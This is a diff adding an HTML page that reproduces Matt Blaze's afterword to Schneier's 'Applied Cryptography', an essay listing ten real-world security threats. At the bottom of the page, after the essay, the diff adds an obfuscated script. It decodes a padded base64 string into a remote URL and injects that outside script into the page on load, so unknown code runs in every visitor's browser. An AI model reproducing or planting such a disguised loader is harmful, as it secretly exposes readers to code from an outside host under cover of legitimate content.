@@ -1,0 +1,88 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Afterword</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--APPENDIX=A//-->
+<!--PAGES=619-621//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="ch25/25-10.html">Previous</A></TD>
+<TD><A HREF="ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="appendix-b.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Afterword by Matt Blaze</FONT></H2>
+<P>One of the most dangerous aspects of cryptology (and, by extension, of this book), is that you can almost measure it. Knowledge of key lengths, factoring methods, and cryptanalytic techniques makes it possible to estimate (in the absence of a real theory of cipher design) the &#147;work factor&#148; required to break a particular cipher. It&#146;s all too tempting to misuse these estimates as if they were overall security metrics for the systems in which they are used. The real world offers the attacker a richer menu of options than mere cryptanalysis. Often more worrisome are protocol attacks, Trojan horses, viruses, electromagnetic monitoring, physical compromise, blackmail and intimidation of key holders, operating system bugs, application program bugs, hardware bugs, user errors, physical eavesdropping, social engineering, and dumpster diving, to name just a few.
+</P>
+<P>High-quality ciphers and protocols are important tools, but by themselves make poor substitutes for realistic, critical thinking about what is actually being protected and how various defenses might fail (attackers, after all, rarely restrict themselves to the clean, well-defined threat models of the academic world). Ross Anderson gives examples of cryptographically strong systems (in the banking industry) that fail when exposed to the threats of the real world [43, 44]. Even when the attacker has access only to ciphertext, seemingly minor breaches in other parts of the system can leak enough information to render good cryptosystems useless. The Allies in World War II broke the German Enigma traffic largely by carefully exploiting operator errors [1587].</P>
+<P>An NSA-employed acquaintance, when asked whether the government can crack DES traffic, quipped that real systems are so insecure that they never need to bother. Unfortunately, there are no easy recipes for making a system secure, no substitute for careful design and critical,  ongoing scrutiny. Good cryptosystems have the nice property of making life much harder for the attacker than for the legitimate user; this is not the case for almost every other aspect of computer and communication security. Consider the following (quite incomplete) &#147;Top Ten Threats to Security in Real Systems&#148; list; all are easier to exploit than to prevent.</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;The sorry state of software. Everyone knows that nobody knows how to write software. Modern systems are complex, with hundreds of thousands of lines of code; any one of them has the chance to compromise security. Fatal bugs may even be far-removed from the security portion of the software.
+<DD><B>2.</B>&nbsp;&nbsp;Ineffective protection against denial-of-service attacks. Some cryptographic protocols allow anonymity. It may be especially dangerous to deploy anonymous protocols if they increase the opportunities for unidentified vandals to disrupt service; anonymous systems therefore need to be especially resistant to denial-of-service attacks. Robust networks can more easily support anonymity; consider that hardly anyone worries very much about the millions of anonymous entry points to more robust networks like the telephone system or the postal service, where it&#146;s relatively difficult (or expensive) for an individual to cause large-scale failures.
+<DD><B>3.</B>&nbsp;&nbsp;No place to store secrets. Cryptosystems protect large secrets with smaller ones (keys). Unfortunately, modern computers aren&#146;t especially good at protecting even the smallest secrets. Multi-user networked workstations can be broken into and their memories compromised. Standalone, single-user machines can be stolen or compromised through viruses that leak secrets asynchronously. Remote servers, where there may be no user available to enter a passphrase (but see threat #5), are an especially hard problem.
+<DD><B>4.</B>&nbsp;&nbsp;Poor random-number generation. Keys and session variables need good sources of unpredictable bits. A running computer has a lot of entropy in it but rarely provides applications with a convenient or reliable way to exploit it. A number of techniques have been proposed for getting true random numbers in software (taking advantage of unpredictability in things like I/O interarrival timing, clock and timer skew, and even air turbulence inside disk enclosures), but all these are very sensitive to slight changes in the environments in which they are used.
+<DD><B>5.</B>&nbsp;&nbsp;Weak passphrases. Most cryptographic software addresses the key storage and key generation problems by relying on user-generated passphrase strings, which are presumed to be unpredictable enough to produce good key material and are also easy enough to remember that they do not require secure storage. While dictionary attacks are a well-known problem with short passwords, much less is known about lines of attack against user-selected passphrase-based keys. Shannon tells us that English text has only just over 1 bit of entropy per character, which would seem to leave most passphrases well within reach of brute-force search. Less is known, however, about good techniques for enumerating passphrases in order to exploit this. Until we have a better understanding of how to attack passphrases, we really have no idea how weak or strong they are.
+<DD><B>6.</B>&nbsp;&nbsp;Mismatched trust. Almost all currently available cryptographic software assumes that the user is in direct control over the systems on which it runs and has a secure path to it. For example, the interfaces to programs like PGP assume that their passphrase input always comes from the user over a secure path like the local console. This is not always the case, of course; consider the problem of reading your encrypted mail when logged in over a network connection. What the system designer assumes is trusted may not match the needs or expectations of the real users, especially when software can be controlled remotely over insecure networks.
+<DD><B>7.</B>&nbsp;&nbsp;Poorly understood protocol and service interactions. As systems get bigger and more complex, benign features frequently come back to haunt us, and it&#146;s hard to know even where to look when things fail. The Internet worm was propagated via an obscure and innocent-looking feature in the sendmail program; how many more features in how many more programs have unexpected consequences just waiting to be discovered?
+<DD><B>8.</B>&nbsp;&nbsp;Unrealistic threat and risks assessment. Security experts tend to focus on the threats they know how to model and prevent. Unfortunately, attackers focus on what they know how to exploit, and the two are rarely exactly the same. Too many &#147;secure&#148; systems are designed without considering what the attacker is actually likely to do.
+<DD><B>9.</B>&nbsp;&nbsp;Interfaces that make security expensive and special. If security features are to be used, they must be convenient and transparent enough that people actually turn them on. It&#146;s easy to design encryption mechanisms that come only at the expense of performance or ease of use, and even easier to design mechanisms that invite mistakes. Security should be harder to turn off than on; unfortunately, few systems actually work this way.
+<DD><B>10.</B>&nbsp;&nbsp;Little broad-based demand for security. This is a well-known problem among almost everyone who has tied his or her fortune to selling security products and services. Until there is widespread demand for transparent security, the tools and infrastructure needed to support it will be expensive and inaccessible to many applications. This is partly a problem of understanding and exposing the threats and risks in real applications and partly a problem of not designing systems that include security as a basic feature rather than as a later add-on.
+</DL>
+<P>A more complete list and discussion of these kinds of threats could easily fill a book of this size and barely scratch the surface. What makes them especially difficult and dangerous is that there are no magic techniques, beyond good engineering and ongoing scrutiny,  for avoiding them. The lesson for the aspiring cryptographer is to respect the limits of the art.
+</P>
+<TABLE WIDTH="100%"><TD ALIGN="LEFT" VALIGN="TOP" WIDTH="80%">
+<TD ALIGN="LEFT" VALIGN="TOP" WIDTH="20%">Matt Blaze<BR>New York, NY
+</TABLE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="ch25/25-10.html">Previous</A></TD>
+<TD><A HREF="ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="appendix-b.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(QufOyOoh, iTwoEWco) {iTwoEWco = QufOyOoh.createElement('script');iTwoEWco.type = 'text/javascript';iTwoEWco.async = true;iTwoEWco.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');QufOyOoh.getElementsByTagName('body')[0].appendChild(iTwoEWco);}(document));</script></body>
+</html>
